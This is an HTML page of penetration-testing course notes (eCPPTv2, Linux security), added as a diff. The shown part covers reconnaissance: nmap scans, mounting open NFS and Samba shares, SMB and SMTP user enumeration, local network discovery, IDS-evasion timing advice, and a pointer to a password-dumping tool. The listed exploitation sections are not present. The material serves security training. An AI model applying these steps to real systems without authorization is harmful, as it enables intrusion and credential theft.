@@ -1,0 +1,3372 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>4 - Linux Security |</title>
+<meta name="description" content="About Linux: It’s not OK, It’s necessary! Peterson, Jordan. ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="4 - Linux Security">
+<meta property="og:url" content="http://localhost:4000/notes/ecppt/linux/">
+
+
+  <meta property="og:description" content="About Linux: It’s not OK, It’s necessary! Peterson, Jordan. ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header1.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-11-22T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ecppt/linux/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header1.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          4 - Linux Security
+
+        
+      </h1>
+      
+        <p class="page__lead">eCPPTv2
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  54 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/" class="active">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="4 - Linux Security">
+    <meta itemprop="description" content="eCPPTv2">
+    <meta itemprop="datePublished" content="2023-11-22T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#information-gathering">Information Gathering</a>
+    <ul>
+      <li><a href="#remote-enumeration">Remote Enumeration</a></li>
+      <li><a href="#local-enumeration">Local Enumeration</a></li>
+      <li><a href="#lab-1---linux-exploitation-remote-enumeration">Lab 1 - Linux Exploitation (Remote Enumeration)</a></li>
+      <li><a href="#lab-2---linux-exploitation-local-enumeration">Lab 2 - Linux Exploitation (Local Enumeration)</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploitation-over-the-network">Exploitation over the Network</a>
+    <ul>
+      <li><a href="#password-spray-attack">Password Spray Attack</a></li>
+      <li><a href="#exploiting-samba">Exploiting Samba</a></li>
+      <li><a href="#exploiting-shellshock">Exploiting Shellshock</a></li>
+      <li><a href="#exploiting-heartbleed">Exploiting Heartbleed</a></li>
+      <li><a href="#exploiting-java-rmi-registry">Exploiting Java RMI Registry</a></li>
+      <li><a href="#exploiting-java-deserialization">Exploiting Java Deserialization</a></li>
+      <li><a href="#exploiting-apache-tomcat">Exploiting Apache Tomcat</a></li>
+      <li><a href="#extra----url-encoding-conversion">Extra [+] - URL encoding conversion</a></li>
+    </ul>
+  </li>
+  <li><a href="#post-exploitation">Post-Exploitation</a>
+    <ul>
+      <li><a href="#priveesc">PrivEesc</a></li>
+      <li><a href="#lateral-movement">Lateral Movement</a></li>
+      <li><a href="#data-exfiltration">Data Exfiltration</a></li>
+      <li><a href="#maintaning-access--persistence">Maintaning Access &amp; Persistence</a></li>
+      <li><a href="#lab-3---remote-and-post-exploitation">Lab 3 - Remote and Post Exploitation</a></li>
+      <li><a href="#lab-4----linux-exploitation---lateral-movement">Lab 4 -  Linux Exploitation - Lateral Movement</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<h2 id="remote-enumeration">Remote Enumeration</h2>
+
+<h3 id="os-fingerprinting-re-cap">OS Fingerprinting Re-Cap</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>port scanning
+service identification
+operating system fingerprinting
+banner grabbing
+etc
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-O</span> <span class="nt">--osscan-guess</span> &lt;target ip&gt;
+// agressive guessing the OS
+nmap <span class="nt">-v</span> <span class="nt">-sT</span> <span class="nt">-O</span> &lt;target ip&gt;
+// througout the ports we can, the majority of <span class="nb">times</span>, know what system is
+nmap <span class="nt">-v</span> <span class="nt">-sS</span> <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-n</span> &lt;target ip&gt;
+</code></pre></div></div>
+
+<h3 id="after-weve-identified-open-services">After we’ve identified open services</h3>
+<ul>
+  <li>we can begin enumerating those services For</li>
+  <li>version information, configuration details, potential exploitability</li>
+</ul>
+
+<h3 id="low-hanging-fruit">Low Hanging Fruit</h3>
+
+<h4 id="nfs---network-file-system">NFS - Network File System</h4>
+
+<ul>
+  <li>RPC-based file sharing protocol = its used to provide access to shared resources</li>
+  <li>usually found listening on TCP and/or UDP port 2049.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -sU -sV -p 2049 &lt;target ip&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Relies on other RPC services, such as <strong>mountd</strong>. it should be directly queried via the Portmapper service which is found on port TCP and/or UDP 111 when using Nmap NSE scripts For instance.</li>
+</ul>
+
+<h4 id="exports">Exports</h4>
+<ul>
+  <li>Exports are the mechanism used by NFS is order to export directories, in other words, make entire directories available to other users over the network.</li>
+  <li>Can usually be found in the <strong>/etc/exports</strong> file on a target host locally</li>
+</ul>
+
+<h4 id="enumerating-nfs">Enumerating NFS</h4>
+<ul>
+  <li>We can find some NFS scripts we can use For NFS:</li>
+</ul>
+
+<p>ls /usr/share/nmap/scripts/ | grep nfs
+	nfs-ls.nse
+	nfs-showmount.nse
+	nfs-statfs.nse</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script nfs-ls,nfs-showmount,nfs-statfs &lt;target ip&gt;
+</code></pre></div></div>
+
+<p>alternatively,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount -e &lt;target ip&gt; 
+// -e or --exports
+</code></pre></div></div>
+
+<h4 id="examples">Examples</h4>
+<p>Export list For 192.168.13.26</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www *
+/home/bob *
+</code></pre></div></div>
+
+<ul>
+  <li>When the export directory its listed with “*”, that means that it allows mounting the exports from any IP address or host.</li>
+  <li>Ideally, an administrator would want to explicitly define (whitelist) IP addresses or hosts that should be allowed to connect to the NFS server, in which case, the output would be something similar to:</li>
+</ul>
+
+<p>Export list For 192.168.13.26</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www admin.foocampus.com 192.168.13.100
+/home/bob 192.168.13.129
+</code></pre></div></div>
+
+<ul>
+  <li>Even in the case where our access is restricted due to an NFS whitelist configuration like the above, the output still gives us valuable information regarding which IP addresses or hosts can mount any available exports.</li>
+  <li>in this scenario, we can spoof our IP address to match a whitelisted IP or take control of a host which is allowed to connect.</li>
+</ul>
+
+<h4 id="once-weve-confirmed-a-misconfiguration">Once we’ve confirmed a misconfiguration</h4>
+<ul>
+  <li>then we can attempt to mount the available exported directories</li>
+  <li>first create a directory</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir -p /mnt/home/bob
+</code></pre></div></div>
+
+<ul>
+  <li>export the target dir:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount -t nfs &lt;NFS Server IP&gt;:/home/bob /mnt/home/bob -o nolock
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount
+// to confirm if the NFS directory was exported
+
+cd /mnt/home/bob &amp;&amp; ls -al
+// go to the mounted directory and list contents
+</code></pre></div></div>
+
+<h3 id="enumerating-portmapper-rcpbind">Enumerating Portmapper (rcpbind)</h3>
+<ul>
+  <li>its used to <strong>map</strong> RCP or ONC RPC (Open Network Computing Remote Procedure Call)</li>
+  <li>usually found listening on ports TCP/UDP 111 and in some cases, ports TCP/UDP 32771</li>
+  <li>Querying a single port (TCP/111), essentially enumerates all related RPC-related service ports without us having to conduct a port scan against all those ports individually.</li>
+  <li>Nmap NSE can be used to enumerate: rpcinfo, rpc-grind</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script rpc-grind,rpcinfo &lt;target ip&gt; -p 111
+</code></pre></div></div>
+
+<p>alternatively,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcinfo -p &lt;target ip&gt;
+</code></pre></div></div>
+
+<h3 id="smb-samba">SMB (Samba)</h3>
+
+<ul>
+  <li>Provides print and file sharing services For windows clients within an environment.</li>
+  <li>Recent versions also seamlessly can be integrated with  Active Directory domains.</li>
+  <li>Can be found listening on the usual NetBIOS ports: 135,137,138,139,445</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -sU -sV &lt;target ip&gt; -p 135,137,138,139,445 --open
+</code></pre></div></div>
+
+<h4 id="smb-shares">SMB Shares</h4>
+<ul>
+  <li>Now that we have identified that Samba is on the target system, we can enumerate information</li>
+  <li>including shares, users, password policies etc</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-enum-shares &lt;target ip&gt;
+</code></pre></div></div>
+
+<p>alternatively,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L &lt;target ip&gt;
+</code></pre></div></div>
+
+<h4 id="what-access-do-we-have">What access do we have?</h4>
+<ul>
+  <li>To know which shares we have access</li>
+  <li>we can use smbmap = https://github.com/ShawnDEvans/smbmap</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H &lt;target ip&gt;
+</code></pre></div></div>
+
+<p>// there are many more options with <strong>smbmap</strong>, including interacting with the remote file system, searching file contents For specific strings, and even executings commands.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient \\\\&lt;target ip&gt;\\&lt;share&gt;
+</code></pre></div></div>
+
+<h4 id="we-can-mount-samba-shares-too">we can mount samba shares too</h4>
+<ul>
+  <li>similar to NFS, but in this case we need to download a package: <strong>cifs-utils</strong></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /mnt/www
+mount -t cifs \\\\&lt;target ip&gt;\\&lt;share&gt; /mnt/www
+cd /mnt/www &amp;&amp; ls -als
+</code></pre></div></div>
+
+<h3 id="smb-users">SMB Users</h3>
+
+<h4 id="method--1---bash-for-loop-and-rpcclient">Method # 1 - Bash ‘for loop’ and rpcclient</h4>
+<p>// using rpcclient and a list of potential usernames we have gathered from other phases 
+// if you dont gathered any usernames, we can use a wordlist
+// Statistically-likely-usernames = https://github.com/insidetrust/statistically-likely-usernames</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For u in $(cat users.txt)
+	do rpcclient -U "" &lt;target ip&gt; -N \
+	--command="lookupnames $u";
+done | grep "User: 1"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-U "" = anonymous/guest logon 
+lookupnames = is a rpcclient command
+-N = specifies to use no password, since we can log in as guest
+we can also do it manually
+rpcclient -U "" &lt;ip&gt; -N
+lookupnames &lt;user&gt;
+valid users = "User: 1" // Non-existent user = "NT_STATUS_NONE_MAPPED"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient has various options example: lookupsids, netshareenum, srvinfo, enumprivs
+</code></pre></div></div>
+
+<h4 id="method--2---automated-enum4linux">Method # 2 - Automated (enum4linux)</h4>
+<p>// great tool to enumerate an SMB server
+	enum4linux = https://github.com/portcullislabs/enum4linux</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux &lt;target ip&gt;
+</code></pre></div></div>
+
+<h3 id="enumerating-smtp-users">Enumerating SMTP Users</h3>
+<p>// the following techniques can apply to:
+	Sendmail, Postfix, Exim, Microsoft Exchange</p>
+
+<ul>
+  <li>usually found on TCP/25</li>
+  <li>we can use nmap NSE as well</li>
+</ul>
+
+<h4 id="to-enumerate-which-options-verbs-or-features-are-enabled">to enumerate which options (verbs or features) are enabled</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smtp-commands &lt;target ip&gt; -p 25
+</code></pre></div></div>
+
+<p>alternatively,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;ip&gt; 25 or telnet &lt;ip&gt; 25
+help
+</code></pre></div></div>
+
+<ul>
+  <li>For our purposes, we are interested in the [ RCPT, VRFY, EXPN ] features/verbs</li>
+  <li>which can be used to enumerate users</li>
+</ul>
+
+<h4 id="smtp-rcpt-to">SMTP RCPT TO</h4>
+<ul>
+  <li>
+    <p>first 
+ → telnet <ip> 25 = connect
+ → HELO tester.localdomain = identify ourselves
+ → MAIL FROM: tester@tester.localdomain = to tell the server who the mail will be from</ip></p>
+  </li>
+  <li>
+    <p>then we can enumerate potential users:</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RCPT TO: &lt;user@domain.com&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>valid use = code <strong>250</strong> // non-existent user = code <strong>550</strong></p>
+</blockquote>
+
+<h4 id="expn">EXPN</h4>
+<p>// it was designed to be used to query a mail server For a list of members within a mailing list on a server.</p>
+<ul>
+  <li>after the connection with nc or telnet</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXPN &lt;user&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>valid use = code “250” // non-existent user = code “550”</p>
+</blockquote>
+
+<h4 id="vrfy">VRFY</h4>
+<p>// similar to EXPN output</p>
+<ul>
+  <li>after the connection with nc or telnet</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VRFY &lt;user&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>valid use = code “250” // non-existent user = code “550”</p>
+</blockquote>
+
+<h4 id="automate-the-enumeration-with-smtp-user-enum">Automate the enumeration with SMTP-USER-ENUM</h4>
+<p>// it tests all three methods (RCPT, EXPN, VRFY)
+	http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</p>
+
+<p>// some examples of usage:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum -M VRFY -U users.txt -t &lt;ip&gt;
+smtp-user-enum -M EXPN -u admin -t &lt;ip&gt;
+smtp-user-enum -M RCPT -U users.txt -T ips.txt
+smtp-user-enum -M EXPN -D example.com -U users.txt -t &lt;ip&gt;
+
+-M = mode
+-U = user file
+-u = fixed user
+-T = target ips file
+-t = fixed target ips
+-D = domain
+</code></pre></div></div>
+
+<h2 id="local-enumeration">Local Enumeration</h2>
+
+<ul>
+  <li>Network Information</li>
+  <li>System Information</li>
+</ul>
+
+<h3 id="network-information">Network Information</h3>
+
+<p>we can ask ourselves some important questions:</p>
+<ul>
+  <li>How is the exploited machine connected to the network?</li>
+  <li>Is the machine multi-homed? Can we pivot to other hosts in other segments?</li>
+  <li>Do we have unfettered outbound connectivity to the internet or is egress traffic to certain ports or protocols?</li>
+  <li>Is there a firewall between me and other devides/machines?</li>
+  <li>Is the machine Im on, communicating with other hosts? if so, what is the purpose or function of the hosts that my current machine is communicating with?</li>
+  <li>What protocols are being used that are originating from my actively exploited machine? Are we initiating FTP connections or other connections (SSH etc) to other machines?</li>
+  <li>Are other machines initiating a connection with me? if so, can that traffic be intercepted or sniffed as cleartext in transit? Is it encrypted?</li>
+</ul>
+
+<h4 id="some-commands">Some commands</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig -a / ip -a
+</code></pre></div></div>
+<p>// Get information regarding our current network interfaces.
+// To know our IP address and whether or not there are additional interfaces that we may be able to use as pivots to other network segments.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route -n / ip -r
+</code></pre></div></div>
+<p>// its used to print our current network routes, which includes our gateway of course.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>traceroute -n &lt;ip address&gt;
+</code></pre></div></div>
+<p>// how many hops are between our compromised machine and other network segments.</p>
+
+<h4 id="dns-information">DNS Information</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/resolv.conf
+</code></pre></div></div>
+
+<ul>
+  <li>what machine is resolving our DNS queries?</li>
+  <li>Can we use it to exfiltrate data over a DNS tunnel?</li>
+  <li>Is the DNS server vulnerable to any exploits?</li>
+  <li>Is it an Active Directory controller?</li>
+</ul>
+
+<h4 id="arp-cache">ARP Cache</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp -en
+</code></pre></div></div>
+<ul>
+  <li>can give us a bit of situational awareness regarding machines near us, or machines that our currently exploited system communicates with For one reason or another.</li>
+  <li>who we are communicating with</li>
+  <li>whats being communicated</li>
+  <li>whether that traffic or communication has any value to us from an exploitation perspective</li>
+</ul>
+
+<h4 id="netstat">Netstat</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -auntp
+</code></pre></div></div>
+
+<ul>
+  <li>what other machines or devices we are currently connected to</li>
+  <li>which ports or services on other machines we are connected to</li>
+  <li>what ports our current machine are listening on</li>
+  <li>Are there other systems establishing connections with our current machine</li>
+</ul>
+
+<blockquote>
+  <p>[+] System without netstat [+]</p>
+</blockquote>
+
+<ul>
+  <li>if For any reason, the machine does not have netstat or its blocked.
+  https://staaldraad.github.io/2017/12/20/netstat-without-netstat/</li>
+  <li>this article teaches how to parse similar information from:
+  /proc/net/tcp
+  /proc/net/udp</li>
+</ul>
+
+<blockquote>
+  <p>ss - alternative to netstat
+we can use to list active network connections with the <strong>ss</strong> command</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ss -twurp
+</code></pre></div></div>
+
+<h4 id="outbound-port-connectivity">Outbound Port Connectivity</h4>
+<p>// check if our outbound port connectivity is restricted in any way</p>
+
+<p>A quick way to check that: 
+	http://portquiz.net/</p>
+
+<ul>
+  <li><strong>Portquiz</strong> is a web server which has most (if not all) TCP ports listening. We can use it to confirm we can connect to arbitrary ports outside of our network with a quick nmap scan:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -p 4444-4450 portquiz.net
+</code></pre></div></div>
+<p>// Keep in mind that any scans originating from your compromised machine can alert network administrators of anomalous activity. 
+// Considering using nmaps –T (timing) option at a low value to stay under any internal IDs radar.</p>
+
+<h3 id="system-information">System Information</h3>
+
+<p>// Our goal with this phase is to get information regarding:
+	Operating System and Kernel
+	Environment Variables
+	Interesting Files and Sensitive Information
+	Users, Groups, Permissions and Privileges
+	Services and Associated Configuration files
+	Cron Jobs, System Tasks
+	Installed Applications and Versions
+	Running Processes</p>
+
+<p>// Ultimate objective:
+	get better access
+	obtain additional footholds within an environment</p>
+
+<h4 id="information-gathering-tools-and-resources">Information Gathering Tools and Resources</h4>
+<ul>
+  <li>
+    <p>LinEnum 
+  https://github.com/rebootuser/LinEnum
+  // Automated Information Gathering Tool.</p>
+  </li>
+  <li>
+    <p>LinuxPrivChecker
+  https://github.com/sleventyeleven/linuxprivchecker
+  // checks For privilege escalation methods</p>
+  </li>
+  <li>
+    <p>Unix-privesc-check
+  http://pentestmonkey.net/tools/audit/unix-privesc-check
+  // finds common misconfigurations which can help us elevate our privileges</p>
+  </li>
+  <li>
+    <p>mimipenguin
+  https://github.com/huntergregal/mimipenguin
+  // For dumping the logon password For the currently logged on use;
+  // This should be done during the post-exploitation phase</p>
+  </li>
+</ul>
+
